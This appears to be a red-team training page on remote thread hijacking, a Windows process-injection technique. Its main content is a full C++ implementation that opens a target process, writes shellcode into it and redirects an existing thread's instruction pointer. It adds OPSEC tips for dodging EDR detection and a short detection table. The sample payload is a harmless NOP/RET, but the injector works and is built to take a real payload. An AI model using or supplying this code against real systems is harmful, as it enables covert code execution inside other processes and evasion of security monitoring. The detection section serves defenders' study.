---
layout: training-page
title: "Remote Thread Hijacking — Red Team Academy"
module: "Evasion"
tags:
  - thread-hijacking
  - process-injection
  - shellcode
  - edr-bypass
  - t1055
page_key: "evasion-thread-hijacking"
render_with_liquid: false
---

# Remote Thread Hijacking

Remote thread hijacking redirects an existing thread in a remote process to execute attacker shellcode — without creating a new thread. Because no `CreateRemoteThread` call is made, this technique evades a common EDR detection trigger. The technique suspends an existing thread, modifies its instruction pointer (RIP/EIP) to point at injected shellcode, then resumes it.

MITRE ATT&CK: **T1055** — Process Injection

---

## How It Differs from CreateRemoteThread

| Approach | Thread creation | Detection signal |
|----------|----------------|-----------------|
| `CreateRemoteThread` | New thread created | High-fidelity EDR event: thread created in remote process |
| Thread hijacking | Existing thread redirected | Lower fidelity: `SetThreadContext` on existing thread |

No new thread is created. The existing thread — already trusted by the OS — executes the payload when resumed.

---

## Required Privileges

- `PROCESS_ALL_ACCESS` on the target process (typically requires SeDebugPrivilege or matching session/user)
- `THREAD_ALL_ACCESS` on the target thread

---

## Full Implementation (C++)

### 1. Find Target Process

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindTargetProcess(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return 0;
}
```

### 2. Find a Thread in the Target Process

Pick the first thread belonging to the target PID. In practice, avoid hijacking the main UI thread of interactive processes — it will freeze the application while shellcode runs.

```cpp
DWORD FindThreadProcess(DWORD targetPID) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(snapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == targetPID) {
                CloseHandle(snapshot);
                return te.th32ThreadID;
            }
        } while (Thread32Next(snapshot, &te));
    }

    CloseHandle(snapshot);
    return 0;
}
```

### 3. Hijack Thread Execution

```cpp
bool HijackThread(DWORD pid, DWORD tid,
                  unsigned char* shellcode, SIZE_T shellcodeSize) {

    // Open target process — need PROCESS_ALL_ACCESS to allocate + write memory
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return false;
    }

    // Open target thread — need THREAD_ALL_ACCESS to suspend/set context
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        printf("[-] OpenThread failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return false;
    }

    // Allocate RW memory in target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, shellcodeSize,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_READWRITE);
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Write shellcode to remote process memory
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem,
                            shellcode, shellcodeSize, &written)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Flip memory to RX before execution
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, shellcodeSize,
                     PAGE_EXECUTE_READ, &oldProtect);

    // Suspend the thread before modifying its context
    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[-] SuspendThread failed: %lu\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Read current thread context (CONTEXT_FULL captures all registers)
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] GetThreadContext failed: %lu\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Save the original RIP — shellcode can restore this to resume normal execution
    DWORD64 originalRip = ctx.Rip;
    printf("[*] Original RIP: 0x%llx\n", originalRip);

    // Redirect RIP to shellcode
    ctx.Rip = (DWORD64)remoteMem;

    // Write modified context back to thread
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[-] SetThreadContext failed: %lu\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Resume — thread will execute shellcode at next scheduling quantum
    ResumeThread(hThread);
    printf("[+] Thread hijacked. Shellcode at: 0x%p\n", remoteMem);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
```

### 4. Main Driver

```cpp
int main() {
    // Target process name
    const char* targetProcess = "notepad.exe";

    // Shellcode — replace with actual payload
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0xC3  // NOP NOP NOP RET
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    DWORD pid = FindTargetProcess(targetProcess);
    if (!pid) {
        printf("[-] Process not found: %s\n", targetProcess);
        return -1;
    }
    printf("[+] Found %s PID: %lu\n", targetProcess, pid);

    DWORD tid = FindThreadProcess(pid);
    if (!tid) {
        printf("[-] No thread found for PID %lu\n", pid);
        return -1;
    }
    printf("[+] Found thread TID: %lu\n", tid);

    if (!HijackThread(pid, tid, shellcode, shellcodeSize)) {
        printf("[-] Hijack failed\n");
        return -1;
    }

    return 0;
}
```

---

## x86 vs x64 Register Names

The `CONTEXT` structure uses different field names depending on the architecture:

| Architecture | Instruction Pointer | Stack Pointer |
|-------------|--------------------|-|
| x64 | `ctx.Rip` | `ctx.Rsp` |
| x86 | `ctx.Eip` | `ctx.Esp` |

For x86 targets, replace `ctx.Rip` with `ctx.Eip` and cast to `DWORD` instead of `DWORD64`.

---

## Return-Oriented Shellcode Pattern

To restore the hijacked thread to its original execution path after the shellcode finishes, append a `jmp` back to the original RIP at the end of your shellcode, or use a stager that:

1. Saves the original RIP value
2. Allocates a second buffer containing `jmp [originalRip]`
3. Returns to it after the payload completes

Without this, the thread will crash when the shellcode returns.

---

## OPSEC Considerations

- **Thread selection matters**: hijacking the main thread of a GUI app (notepad, explorer) causes visible freezes while shellcode runs. Target background worker threads or Windows service processes with idle threads
- **Avoid `PROCESS_ALL_ACCESS`** on sensitive processes — prefer `PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION`
- **`SetThreadContext`** is logged by some EDR products as a high-confidence injection signal — combine with other evasion techniques (syscall proxying, HookChain)
- **Timing**: wait for the target thread to be in a safe/suspendable state to avoid race conditions

---

## Detection

| Signal | Source |
|--------|--------|
| `SuspendThread` → `SetThreadContext` → `ResumeThread` sequence | EDR API trace |
| `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` cross-process | EDR memory events |
| Thread RIP pointing outside any loaded module | Memory scanner |
| Cross-process memory write to executable region | EDR behavioral |

```
# Sysmon EventID 8: CreateRemoteThread (does NOT fire for thread hijack)
# Look for OpenThread with THREAD_ALL_ACCESS (EventID 10 subset) + subsequent SetThreadContext
```

---

## Resources

- MITRE ATT&CK T1055 — Process Injection — `attack.mitre.org/techniques/T1055/`
- Thread Execution Hijacking (ired.team) — `ired.team/offensive-security/code-injection-process-injection/thread-hijacking`
- ThreadJack (PoC implementation) — `github.com/rasta-mouse/ThreadJack`
- Windows CONTEXT structure — `docs.microsoft.com/windows/win32/api/winnt/ns-winnt-context`
